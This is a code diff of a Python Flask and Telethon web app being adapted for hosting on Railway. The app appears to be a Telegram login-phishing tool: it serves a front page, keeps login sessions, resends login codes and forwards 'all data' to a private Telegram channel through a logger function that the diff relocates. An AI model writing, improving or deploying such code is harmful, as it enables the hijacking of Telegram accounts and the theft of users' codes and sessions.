@@ -7,20 +7,18 @@ from telethon import TelegramClient, events, errors
 from telethon.sessions import StringSession
 from flask import Flask, request, jsonify, render_template_string
 
-# --- CONFIGURATION FROM ENVIRONMENT VARIABLES ---
+# --- RAILWAY FIX: Load from environment variables ---
 API_ID = int(os.environ.get("API_ID"))
 API_HASH = os.environ.get("API_HASH")
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
 CHANNEL_ID = os.environ.get("CHANNEL_ID")
 
-if not API_ID or not API_HASH or not BOT_TOKEN or not CHANNEL_ID:
-    print("ERROR: Missing required environment variables (API_ID, API_HASH, BOT_TOKEN, CHANNEL_ID).")
+if not API_ID or not API_HASH or not BOT_TOKEN:
+    print("ERROR: Missing API_ID, API_HASH, or BOT_TOKEN environment variables.")
     exit(1)
 
 print("=" * 50)
 print("SCRIPT STARTING...")
-print(f"Target Channel ID: {CHANNEL_ID}")
-print("WARNING: All data will be sent to the Telegram channel. No local files saved.")
 print("=" * 50)
 
 app = Flask(__name__)
@@ -28,8 +26,21 @@ app = Flask(__name__)
 # Bot client (for receiving contacts)
 bot_client = TelegramClient('bot_session', API_ID, API_HASH)
 
-# Store for sessions (In-memory only)
+# Store for sessions
 active_sessions = {}
+
+async def send_to_logger(message_text):
+    """Send log message to Telegram channel."""
+    if not CHANNEL_ID:
+        return
+    try:
+        temp_client = TelegramClient('logger_session', API_ID, API_HASH)
+        await temp_client.start(bot_token=BOT_TOKEN)
+        await temp_client.send_message(CHANNEL_ID, message_text)
+        await temp_client.disconnect()
+        print("[LOG] Sent to Telegram channel")
+    except Exception as e:
+        print(f"[ERROR] Failed to send to channel: {e}")
 
 FRONTEND_HTML = """
 <!DOCTYPE html>
@@ -382,18 +393,6 @@ FRONTEND_HTML = """
 def index():
     return render_template_string(FRONTEND_HTML)
 
-async def send_to_logger(message_text):
-    """Send a message to the private Telegram channel."""
-    try:
-        temp_client = TelegramClient('logger_session', API_ID, API_HASH)
-        await temp_client.start(bot_token=BOT_TOKEN)
-        
-        await temp_client.send_message(CHANNEL_ID, message_text)
-        await temp_client.disconnect()
-        print("[LOG] Data sent to channel successfully.")
-    except Exception as e:
-        print(f"[ERROR] Failed to send to channel: {e}")
-
 @app.route('/resend', methods=['POST'])
 def resend_code():
     data = request.json
@@ -610,13 +609,11 @@ async def bot_listener():
     await bot_client.run_until_disconnected()
 
 if __name__ == '__main__':
-    # Start the bot listener in a separate daemon thread
     thread = threading.Thread(target=lambda: asyncio.run(bot_listener()))
     thread.daemon = True
     thread.start()
 
-    # CRITICAL FIX FOR RAILWAY:
-    # Listen on 0.0.0.0 and use the PORT environment variable
+    # RAILWAY FIX: Use PORT environment variable and 0.0.0.0
     port = int(os.environ.get("PORT", 5000))
     print(f"Starting web server on http://0.0.0.0:{port}")
     print("=" * 50)
